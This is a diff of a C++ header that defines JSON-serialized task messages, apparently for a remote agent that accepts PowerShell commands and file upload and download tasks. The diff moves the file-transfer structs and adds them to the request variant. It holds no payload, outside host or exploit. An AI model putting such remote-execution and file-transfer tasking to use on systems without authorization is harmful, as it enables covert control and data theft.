@@ -166,35 +166,7 @@ struct TaskError
 	}
 };
 
-struct CommandUploadFile
-{
-	std::string path;
-
-	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
-	{
-		rapidjson::Value value(rapidjson::kObjectType);
-		value.AddMember("Path", rapidjson::Value(path.c_str(), allocator), allocator);
-		return value;
-	}
-};
-
-struct CommandDownloadFile
-{
-	std::string path;
-	std::string data;
-	std::int64_t offset;
-	std::int64_t totalBytes;
-	bool final;
-
-	rapidjson::Value ToJsonValue(rapidjson::Document::AllocatorType &allocator) const
-	{
-		rapidjson::Value value(rapidjson::kObjectType);
-		value.AddMember("Path", rapidjson::Value(path.c_str(), allocator), allocator);
-		return value;
-	}
-};
-
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandUploadFile>, TaskRequest<CommandDownloadFile>, TaskRequest<bool>>;
 using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response> &tasks)
@@ -217,4 +189,4 @@ inline std::string CreateResponseTaskValue(const std::deque<Response> &tasks)
 
 	return strbuf.GetString();
 }
-//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//};
